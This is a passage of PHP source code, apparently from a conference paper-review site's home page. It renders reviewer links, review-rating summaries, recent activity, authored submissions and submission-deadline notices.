	echo $sep, "<a href='", hoturl("offline"), "'>Offline reviewing</a>";
	$sep = $xsep;
    }
    if ($Me->isRequester) {
	echo $sep, "<a href='", hoturl("mail", "monreq=1"), "'>Monitor external reviews</a>";
	$sep = $xsep;
    }

    if ($myrow && $Conf->setting("rev_ratings") != REV_RATINGS_NONE) {
	$badratings = PaperSearch::unusableRatings($Me->privChair, $Me->cid);
	$qx = (count($badratings) ? " and not (PaperReview.reviewId in (" . join(",", $badratings) . "))" : "");
	/*$result = $Conf->qe("select rating, count(distinct PaperReview.reviewId) from PaperReview join ReviewRating on (PaperReview.contactId=$Me->cid and PaperReview.reviewId=ReviewRating.reviewId$qx) group by rating order by rating desc", "while checking ratings");
	if (edb_nrows($result)) {
	    $a = array();
	    while (($row = edb_row($result)))
		if (isset($ratingTypes[$row[0]]))
		    $a[] = "<a href=\"" . hoturl("search", "q=rate:%22" . urlencode($ratingTypes[$row[0]]) . "%22") . "\" title='List rated reviews'>$row[1] of your reviews</a> as " . htmlspecialchars($ratingTypes[$row[0]]);
	    if (count($a) > 0) {
		echo "<div class='hint g'>\nOther reviewers ",
		    "<a href='", hoturl("help", "t=revrate"), "' title='What is this?'>rated</a> ",
		    commajoin($a);
		if (count($a) > 1)
		    echo " (these sets might overlap)";
		echo ".</div>\n";
	    }
	}*/
	$result = $Conf->qe("select rating, count(PaperReview.reviewId) from PaperReview join ReviewRating on (PaperReview.contactId=$Me->cid and PaperReview.reviewId=ReviewRating.reviewId$qx) group by rating order by rating desc", "while checking ratings");
	if (edb_nrows($result)) {
	    $a = array();
	    while (($row = edb_row($result)))
		if (isset($ratingTypes[$row[0]]))
		    $a[] = "<a href=\"" . hoturl("search", "q=rate:%22" . urlencode($ratingTypes[$row[0]]) . "%22") . "\" title='List rated reviews'>$row[1] &ldquo;" . htmlspecialchars($ratingTypes[$row[0]]) . "&rdquo; " . pluralx($row[1], "rating") . "</a>";
	    if (count($a) > 0) {
		echo "<div class='hint g'>\nYour reviews have received ",
		    commajoin($a);
		if (count($a) > 1)
		    echo " (these sets might overlap)";
		echo ".<a class='help' href='", hoturl("help", "t=revrate"), "' title='About ratings'>?</a></div>\n";
	    }
	}
    }

    if ($Me->isReviewer) {
	$plist = new PaperList(new PaperSearch($Me, array("q" => "re:me")), array("list" => true));
        $plist->showHeader = PaperList::HEADER_TITLES;
	$ptext = $plist->text("reviewerHome", $Me);
	if ($plist->count > 0)
	    echo "<div class='fx'><div class='g'></div>", $ptext, "</div>";
    }

    if ($Conf->setting("rev_tokens"))
	reviewTokenGroup(false);

    if ($Me->amReviewer()) {
	require_once("Code/commentview.inc");
	$entries = $Conf->reviewerActivity($Me, time(), 30);
	if (count($entries)) {
	    $fold20 = defval($_SESSION, "foldhomeactivity", 1) ? "fold20c" : "fold20o";
	    echo "<div class='homegrp $fold20 fold21c' id='homeactivity'>",
		foldbutton("homeactivity", "recent activity", 20),
		"&nbsp;<h4><a href=\"javascript:void fold('homeactivity',null,20)\" class='x homeactivity'>Recent activity<span class='fx20'>:</span></a></h4>";
	    if (count($entries) > 10)
		echo "&nbsp; <a href=\"javascript:void fold('homeactivity',null,21)\" class='fx20'><span class='fn21'>More &#187;</span><span class='fx21'>&#171; Fewer</span></a>";
	    echo foldsessionpixel("homeactivity20", "foldhomeactivity"),
		"<div class='fx20' style='overflow:hidden;padding-top:3px'><table><tbody>";
	    foreach ($entries as $which => $xr) {
		$tr_class = "k" . ($which % 2) . ($which >= 10 ? " fx21" : "");
		if ($xr->isComment)
		    echo CommentView::commentFlowEntry($Me, $xr, $tr_class);
		else
		    echo $rf->reviewFlowEntry($Me, $xr, $tr_class);
	    }
	    echo "</tbody></table></div></div>";
	}
    }

    echo "<hr class='home' /></div>\n";
}

// Authored papers
if ($Me->isAuthor || $Conf->timeStartPaper() > 0 || $Me->privChair
    || !$Me->amReviewer()) {
    echo "<div class='homegrp' id='homeau'>";

    // Overview
    if ($Me->isAuthor)
	echo "<h4>Your Submissions: &nbsp;</h4> ";
    else
	echo "<h4>Submissions: &nbsp;</h4> ";

    $startable = $Conf->timeStartPaper();
    if ($startable && !$Me->validContact())
	echo "<span class='deadline'>", $Conf->printableDeadlineSetting("sub_reg", "span"), "</span><br />\n<small>You must sign in to register papers.</small>";
    else if ($startable || $Me->privChair) {
	echo "<strong><a href='", hoturl("paper", "p=new"), "'>Start new paper</a></strong> <span class='deadline'>(", $Conf->printableDeadlineSetting("sub_reg", "span"), ")</span>";
	if ($Me->privChair)
	    echo "<br />\n<span class='hint'>As an administrator, you can start a paper regardless of deadlines and on behalf of others.</span>";
    }

    $plist = null;
    if ($Me->isAuthor) {
	$plist = new PaperList(new PaperSearch($Me, array("t" => "a")), array("list" => true));
	$ptext = $plist->text("authorHome", $Me);
	if ($plist->count > 0)
	    echo "<div class='g'></div>\n", $ptext;
    }

    $deadlines = array();
    if ($plist && $plist->any->need_submit) {
	if (!$Conf->timeFinalizePaper()) {
	    // Be careful not to refer to a future deadline; perhaps an admin
	    // just turned off submissions.
	    if ($Conf->deadlinesBetween("", "sub_sub", "sub_grace"))
		$deadlines[] = "The site is not open for submissions at the moment.";
	    else
		$deadlines[] = "The <a href='" . hoturl("deadlines") . "'>deadline</a> for submitting papers has passed.";
	} else if (!$Conf->timeUpdatePaper()) {
	    $deadlines[] = "The <a href='" . hoturl("deadlines") . "'>deadline</a> for updating papers has passed, but you can still submit.";
	    $time = $Conf->printableTimeSetting("sub_sub", "span", " to submit papers");
	    if ($time != "N/A")
		$deadlines[] = "You have until $time.";
	} else {
            $time = $Conf->printableTimeSetting("sub_update", "span", " to submit papers");
            if ($time != "N/A")
                $deadlines[] = "You have until $time.";
        }
    }
    if (!$startable && !count($deadlines)) {
	if ($Conf->deadlinesAfter("sub_open"))
	    $deadlines[] = "The <a href='" . hoturl("deadlines") . "'>deadline</a> for registering new papers has passed.";
	else
	    $deadlines[] = "The site is not open for submissions at the moment.";
    }
    if ($plist && $Conf->timeSubmitFinalPaper() && $plist->any->accepted) {
	$time = $Conf->printableTimeSetting("final_soft");
	if ($Conf->deadlinesAfter("final_soft") && $plist->any->need_final)
	    $deadlines[] = "<strong class='overdue'>Final versions are overdue.</strong>  They were requested by $time.";
	else if ($time != "N/A")
	    $deadlines[] = "Submit final versions of your accepted papers by $time.";
    }
    if (count($deadlines) > 0) {
	if ($plist && $plist->count > 0)
	    echo "<div class='g'></div>";
	else if ($startable || $Me->privChair)
	    echo "<br />";
	echo "<span class='deadline'>",
	    join("</span><br />\n<span class='deadline'>", $deadlines),
	    "</span>";
    }

    echo "<hr class='home' /></div>\n";
}


// Review tokens
if ($Me->valid() && $Conf->setting("rev_tokens"))
    reviewTokenGroup(true);


echo "<div class='clear'></div>\n";
$Conf->footer();
